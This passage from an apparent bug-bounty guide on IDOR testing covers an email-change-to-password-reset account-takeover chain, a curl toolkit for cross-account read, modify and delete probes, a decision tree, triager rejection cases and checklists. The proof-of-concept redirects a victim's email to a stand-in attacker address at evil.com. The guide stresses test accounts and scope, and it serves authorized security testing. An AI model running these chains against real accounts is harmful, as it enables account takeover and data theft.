This works because many applications treat "change my email" as a lower-friction, lower-scrutiny action than "reset my password" — email-change endpoints are less consistently protected by re-authentication (asking for the current password again) or by requiring confirmation from the *old* email address before the change takes effect. If you find an IDOR on the profile-update endpoint (not just a read-only IDOR on profile-view), always test whether it lets you change the email field specifically — this single check turns a Medium-severity data-exposure bug into a Critical account-takeover chain.

**Step-by-step chain PoC**:

```bash
#!/bin/bash
TOKEN_ATTACKER="Bearer ...attackerToken"
VICTIM_ID="88213"
ATTACKER_CONTROLLED_EMAIL="attacker-controlled@evil.com"

echo "[Step 1] Attempt to change victim's email via IDOR on profile-update endpoint"
curl -s -X PUT "https://target.example.com/api/users/$VICTIM_ID/email" \
    -H "Authorization: $TOKEN_ATTACKER" \
    -H "Content-Type: application/json" \
    -d "{\"email\": \"$ATTACKER_CONTROLLED_EMAIL\"}" \
    -w "\nHTTP %{http_code}\n"

echo "[Step 2] If successful, trigger password reset for the victim's account"
curl -s -X POST "https://target.example.com/api/auth/forgot-password" \
    -H "Content-Type: application/json" \
    -d "{\"identifier\": \"victim_username_or_original_email\"}" \
    -w "\nHTTP %{http_code}\n"

echo "[Step 3] Check the attacker-controlled inbox for the reset link — DO NOT complete the takeover on a real account."
echo "For a bug bounty PoC, stop after confirming the reset email would be delivered to the attacker's address, or use two of your own test accounts (A as 'victim', B as 'attacker') to complete the full chain safely."
```

**Critical ethical/scope note**: never complete this chain against a real user's account, even to "prove impact." Demonstrate it end-to-end using two accounts you control (both created as test accounts under your own identity), and describe the chain's completion in the report rather than executing it against a live victim.

## 12. Practical Bash/Curl Toolkit (Consolidated)

```bash
#!/bin/bash
# idor_full_toolkit.sh — a consolidated script combining the key IDOR tests above
# Usage: ./idor_full_toolkit.sh <base_url> <object_path> <object_id> <token_owner> <token_other>

BASE_URL="$1"
OBJECT_PATH="$2"    # e.g. "api/orders"
OBJECT_ID="$3"
TOKEN_OWNER="$4"
TOKEN_OTHER="$5"

echo "=========================================="
echo "IDOR Test Harness"
echo "Target: $BASE_URL/$OBJECT_PATH/$OBJECT_ID"
echo "=========================================="

echo -e "\n[1] Baseline — owner accessing their own object"
curl -s -o /tmp/owner_resp.json -w "HTTP %{http_code}\n" \
    -H "Authorization: Bearer $TOKEN_OWNER" \
    "$BASE_URL/$OBJECT_PATH/$OBJECT_ID"

echo -e "\n[2] Cross-account — other user accessing owner's object (GET)"
curl -s -o /tmp/other_get_resp.json -w "HTTP %{http_code}\n" \
    -H "Authorization: Bearer $TOKEN_OTHER" \
    "$BASE_URL/$OBJECT_PATH/$OBJECT_ID"

echo -e "\n[3] Cross-account — other user modifying owner's object (PUT)"
curl -s -o /tmp/other_put_resp.json -w "HTTP %{http_code}\n" \
    -X PUT -H "Authorization: Bearer $TOKEN_OTHER" \
    -H "Content-Type: application/json" -d '{"test_field":"idor_probe"}' \
    "$BASE_URL/$OBJECT_PATH/$OBJECT_ID"

echo -e "\n[4] Cross-account — other user deleting owner's object (DELETE) [CAUTION: destructive, confirm scope allows this before running]"
read -p "    Run destructive DELETE test? (y/N): " CONFIRM
if [[ "$CONFIRM" == "y" ]]; then
    curl -s -o /tmp/other_delete_resp.json -w "HTTP %{http_code}\n" \
        -X DELETE -H "Authorization: Bearer $TOKEN_OTHER" \
        "$BASE_URL/$OBJECT_PATH/$OBJECT_ID"
fi

echo -e "\n[5] No authentication at all"
curl -s -o /tmp/noauth_resp.json -w "HTTP %{http_code}\n" \
    "$BASE_URL/$OBJECT_PATH/$OBJECT_ID"

echo -e "\n[6] Diff owner vs. other-user GET responses"
diff /tmp/owner_resp.json /tmp/other_get_resp.json && echo "IDENTICAL — likely IDOR" || echo "Different — inspect manually"

echo -e "\n=========================================="
echo "Review all /tmp/*_resp.json files manually before drawing conclusions."
echo "=========================================="
```

## 13. Decision Tree: IDOR Exploitation Path

```
START: You've found a parameter/path segment that looks like an object reference (ID, UUID, filename)
│
├── Q1: Does changing the ID to another known value (User B's object) return DIFFERENT data than a 403/404?
│   │
│   ├── YES, full object data returned ─────────────► Confirmed READ IDOR
│   │                                                  │
│   │                                                  ├── Does the object contain PII/financial/auth-relevant data?
│   │                                                  │     ├── YES ──► Document as Medium–High depending on data sensitivity
│   │                                                  │     └── NO  ──► Document as Low–Medium (still valid, limited impact)
│   │                                                  │
│   │                                                  └── Can you enumerate MANY objects (mass IDOR)?
│   │                                                        ├── YES ──► Escalate severity; note "affects entire user base" in report
│   │                                                        └── NO (single object only) ──► Note limited blast radius
│   │
│   ├── NO, but response differs subtly (partial data, different error) ─► Possible PARTIAL IDOR — investigate further (Section 14 false positives)
│   │
│   └── NO, proper 403/404 returned ─────────────────► Not read-IDOR on GET. Proceed to Q2.
│
├── Q2: Does the SAME endpoint accept PUT/PATCH/DELETE with the foreign object ID?
│   │
│   ├── YES, modification/deletion succeeds ─────────► Confirmed WRITE IDOR (typically higher severity than read-only)
│   │                                                  │
│   │                                                  └── Does the modifiable field include email/password/role/permissions?
│   │                                                        ├── YES ──► HIGH-CRITICAL — proceed to Section 11 (ATO chain)
│   │                                                        └── NO  ──► Document as Medium-High based on what CAN be modified
│   │
│   └── NO ───────────────────────────────────────────► Proceed to Q3.
│
├── Q3: Is there a SECONDARY endpoint that operates on the same object type (export, duplicate, share, audit-log)?
│   │
│   ├── YES ──► Repeat Q1/Q2 against the secondary endpoint (often weaker checks — see Section 2.5)
│   └── NO  ──► Proceed to Q4.
│
├── Q4: Does the application use GraphQL for this object type?
│   │
│   ├── YES ──► Test nested-field authorization gaps (Section 7) and mutation-based access (see saml-graphql.md)
│   └── NO  ──► Proceed to Q5.
│
├── Q5: Is there a mobile app client for this platform?
│   │
│   ├── YES ──► Intercept mobile traffic; diff request bodies against web (Section 6) for hidden parameters
│   └── NO  ──► Proceed to Q6.
│
└── Q6: Try advanced bypasses: HPP (10.1), Content-Type switching (10.2), method override (10.3),
        API version downgrade (10.4), ID format fuzzing (10.5).
        │
        ├── Any bypass succeeds ──► Return to Q1/Q2 with the bypass applied
        └── All bypasses fail ────► Likely NOT vulnerable via this vector; document negative findings and move to next object type
```

## 14. Triager Rejection Cases & False-Positive Analysis

Understanding how triagers reject weak IDOR reports lets you pre-empt every objection before submitting.

### 14.1 "This is just a generic error page, not real data" (False Positive)

The single most common false positive in automated/rushed IDOR testing: a "successful" 200 response to a cross-account request that actually just renders a generic "not found" or empty-state page with a 200 status code (many SPAs return 200 for client-side-routed 404s). **Always inspect the actual response body content, not just the HTTP status code.** Diff the byte-for-byte content, not just the status code, and specifically check for placeholder/empty-state markers.

```bash
# Don't just check status code — grep for known empty-state markers
curl -s -H "Authorization: Bearer $TOKEN_OTHER" "$TARGET" | grep -iE "not found|no data|empty state|access denied" && echo "LIKELY FALSE POSITIVE — generic error rendered as 200" || echo "Proceed with manual review"
```

### 14.2 "This data is intentionally public" (Rejection)

Some object types are meant to be publicly viewable by ID (public product listings, public forum posts, public user profiles by design). Before reporting, verify from the application's own UI/documentation whether the object type in question has any stated privacy expectation. If a "public profile" page is *designed* to be viewable via a shareable link by anyone, finding you can view it by ID isn't an IDOR — it's intended functionality. Cross-check: does the *owner's own UI* present any indication that this object is private (a lock icon, a "only visible to you" label, a permission toggle)? If yes, and the toggle isn't enforced server-side, that's the actual bug — report the *inconsistency*, not just "I could view it."

### 14.3 "Requires the object ID which is not realistically obtainable" (Severity Reduction, not full rejection)

If exploitation strictly requires guessing a long, cryptographically random UUID with no disclosure vector anywhere in the app, triagers will often accept the report but downgrade severity, since the "attack complexity" is effectively equivalent to a secure capability URL. Counter this by demonstrating an actual disclosure path (Section 3.5) — if you can show the UUID is obtainable through any realistic means (another endpoint, a shared link, a notification, a webhook payload, browser history/Referer leakage), state this explicitly and you'll usually get full severity restored.

### 14.4 "Duplicate of a known/previously-reported issue" (Rejection)

Before extensive testing, do a quick pass on the program's already-disclosed/resolved reports (if the program has a public disclosure history on HackerOne) for the same endpoint pattern — resubmitting a known issue wastes your time and the triager's. If you find a variant of a previously fixed IDOR on a *different* endpoint of the same type, explicitly note this in your report ("this appears related to previously reported issue #XXXX but affects a different endpoint that wasn't covered by that fix") — this significantly increases triager confidence and speed of acceptance.

### 14.5 "Low severity because it's read-only and only affects test/demo accounts" (Severity Reduction)

If your two-account testing happens to land on data that's clearly seeded demo/sample content rather than a real customer's data, the triager may (correctly) note that real-world impact is unproven. Where possible, use accounts with realistic data volume and content that plausibly mirrors what a real customer's account would contain, and explicitly state in the report that the finding generalizes to any account, not just your specific test data.

### 14.6 "Self-XSS-style: requires attacker to already control the victim's session" (Rejection)

A subtler rejection pattern: if your "IDOR" actually requires the attacker to already be authenticated *as the victim* (e.g., you demonstrated it by modifying your own session's cookie rather than truly using a separate, independently-obtained attacker session against a separate victim account), the triager will correctly reject it as not demonstrating a real cross-user vulnerability. Always use genuinely separate accounts/sessions/browsers for your PoC, and make this separation explicit and visible in your report's evidence (screenshots/video showing two distinct browser windows, two distinct account emails).

### 14.7 "Rate-limited / requires excessive enumeration to be practically exploitable" (Severity Discussion)

If your mass-IDOR requires enumerating millions of sequential IDs and the platform has effective rate limiting that would realistically prevent bulk exfiltration, triagers may still accept the report (the underlying authorization flaw is real) but negotiate on severity, weighing "theoretically affects all users" against "practically limited by rate limiting to N requests/minute." Test and document the actual rate limit you observed — if it's weak or trivially bypassed (Section on WAF bypass IP rotation techniques), say so explicitly, since this is exactly the detail that swings severity back up.

## 15. Severity and CVSS Scoring Guidance

IDOR severity should be assessed primarily on:

- **Confidentiality impact**: what class of data is exposed (PII, financial, health, authentication secrets, internal business data)?
- **Integrity impact**: read-only vs. write/delete capability
- **Scope**: single object vs. mass-enumerable across the entire user base
- **Privilege required**: does exploitation require any authentication at all, or is it fully unauthenticated?
- **User interaction**: none required (direct API call) vs. requires social engineering

A rough mental model many programs use:
- **Critical**: unauthenticated or low-privilege write/delete access to any user's sensitive data, or any chain reaching account takeover
- **High**: authenticated read access to another user's sensitive/financial/PII data, especially if mass-enumerable
- **Medium**: authenticated read access to another user's non-sensitive data, or write access to low-impact fields
- **Low**: minor information disclosure with limited practical impact (e.g., confirming an object/user exists without exposing content — an "existence oracle")

Always propose a severity in your report, but expect and accept triager negotiation — cite the specific data fields and the specific chain you demonstrated rather than asserting severity in the abstract.

## 16. Reviewer Checklist

Use this if you're the one triaging/reviewing an IDOR submission (your own, before submitting, or someone else's):

- [ ] Was the finding demonstrated with two genuinely separate, independently-authenticated accounts/sessions?
- [ ] Is the response body content verified (not just the HTTP status code) to contain real, victim-specific data?
- [ ] Has the possibility of a generic error page rendered with a 200 status been ruled out?
- [ ] Has the object type's intended privacy model been checked against the application's own UI/documentation?
- [ ] Is the object identifier's realistic obtainability (guessable, enumerable, or disclosed elsewhere) documented?
- [ ] Were both read (GET) and write (PUT/PATCH/DELETE) access tested, not just one?
- [ ] Was the same test repeated across all discoverable API versions (v1/v2/legacy/mobile)?
- [ ] If GraphQL is in use, were nested fields and mutation return types tested, not just top-level queries?
- [ ] If a chain to account takeover is claimed, was it demonstrated using only test accounts, never a real victim?
- [ ] Does the report clearly state the exact endpoint, exact parameter, exact payload, and exact evidence (not just "it works")?
- [ ] Has severity been justified with specific data-sensitivity and scope reasoning, not just asserted?
- [ ] Has the report been checked against the program's previously disclosed reports for duplication?

## 17. Hunter Checklist

Use this as your working checklist while actively hunting for IDOR on a target:

- [ ] Built a complete map of every object-reference parameter across web, mobile, and any discoverable API versions
- [ ] Created two (or more) test accounts with distinct, clearly-fake but realistic data
- [ ] Tested GET, PUT, PATCH, DELETE for every mapped object-reference endpoint with a foreign session
- [ ] Tested with no authentication at all, in addition to cross-account testing
- [ ] Enumerated sequential/predictable ID ranges where applicable, with appropriate rate limiting
- [ ] Checked whether disclosed UUIDs elsewhere in the app defeat "unguessable ID" assumptions
- [ ] Intercepted and diffed mobile app traffic against web traffic for hidden parameters
- [ ] Tested GraphQL nested-field and mutation-return-type authorization if applicable
- [ ] Tried HTTP Parameter Pollution, Content-Type switching, method override headers, and ID format fuzzing
- [ ] Checked secondary/less-obvious endpoints (export, duplicate, share, archive, audit-log) for the same object types
- [ ] Investigated whether any discovered auth cookie/header embeds a user/object identifier that could be manipulated independently of session validity
- [ ] For every positive finding, attempted to chain toward higher impact (especially email-change → password-reset → ATO)
- [ ] Verified every "positive" result isn't a generic error page or empty state rendered with a 200 status
- [ ] Documented exact reproduction steps, exact evidence, and a justified severity estimate before submitting
